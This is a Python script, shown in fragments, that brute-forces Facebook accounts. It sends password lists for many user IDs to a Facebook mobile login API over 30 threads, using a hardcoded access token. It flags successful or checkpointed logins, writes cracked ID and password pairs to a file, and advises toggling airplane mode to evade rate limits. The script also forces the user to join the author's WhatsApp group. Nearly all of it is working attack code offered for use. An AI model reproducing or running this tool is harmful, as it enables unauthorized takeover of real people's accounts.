...
def free(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;92m [Successful-MR Raj] {idf} * {pw}')
...
.............. 01932804722 .............
\033[1;92m══════════════════════════════════════════════════
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   : RAJ CHOWDHURY
\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : Raj Chowdhury      
\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : Rajchowdhury798
\33[1;32m𝕍𝕖𝕣𝕤𝕚𝕠𝕟  : 5.0.0
\033[1;92m══════════════════════════════════════════════════
\33[1;41m\33[1;37m▓░▒░▒▓░▒░▒▓░▒▓░▒▓█[  Any Problem Whatapp Nock 01932804722 ]█▓▒░▓░▒░▒▓░▒▓░▒▓\33[0m
\033[1;92m══════════════════════════════════════════════════"""
class Main:
	def __init__(self):
		self.id = []
		...
		print("")
		print("\33[1;37m")
		print("\033[1;37mNote : \33[1;41m\33[1;37mAprovel Join Our Whatsapp Group  \33[0m")
		print("══════════════════════════════════════════════════")
		print("══════════════════════════════════════════════════")
		print("\033[1;32m  |1| \33[1;37m JOIN OUR WHATSAPP GROUP ")
		...
		if Baloch in ["", " "]:
			...
			os.system("xdg-open https://chat.whatsapp.com/Gw8OxgE1gDDDzd3W3tIJpz")
			print("══════════════════════════════════════════════════")
			time.sleep(3.0)
			print("\033[1;32m     You Not Join This Group Join again")
			print("══════════════════════════════════════════════════")
			input("\n\033[1;37m My Whatsapp Group Name :  \033[1;37m")
			time.sleep(3.1)
			print("══════════════════════════════════════════════════")
			print("\033[1;32m THANKS FOR JOIN MY WHATSAPP GROUP ")
			time.sleep(3.0)
			os.system("clear")
		print(logo)
		print(" ══════════════════════════════════════════════════")
	...
	def old(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CHOICE THISPASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("     \033[0;97m   FREE MODE ACTIVATE")
				print("\n\033[0;97m [+] BRUTE HAS BEEN START")
				print(" \033[0;97m[+] Note: CP AC OPEN 60% JUST NOW")
				print(" [!] IF NOT RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;94m══════════════════════════════════════════════════")
				print("══════════════════════════════════════════════════\n")
				print("\033[1;37m")
				for user in self.id:
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Just- Now]%s | %s\033[1;32m         "%(uid, pw))
	...
	def old2(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [*] CHOICE THIS PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("     \033[0;97m   ACTIVATE")
				print("\n\033[0;97m [+] BRUTE HAS BEEN START")
				print(" \033[0;97m[+] Note: Cp Ac Open 60% just now")
				print(" [!] IF NOT RESULT USE AIRPLANE MODE 5 SECONDS")
				print("\033[0;97m══════════════════════════════════════════════════")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m[Raj Ok-Just Now ] %s | %s\033[0;32m         "%(uid, pw))
				print ("\r \033[1;32m Congrats ")
				self.ok.append("%s|%s"%(uid, pw))
				open("Raj Ok-Just Now ","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
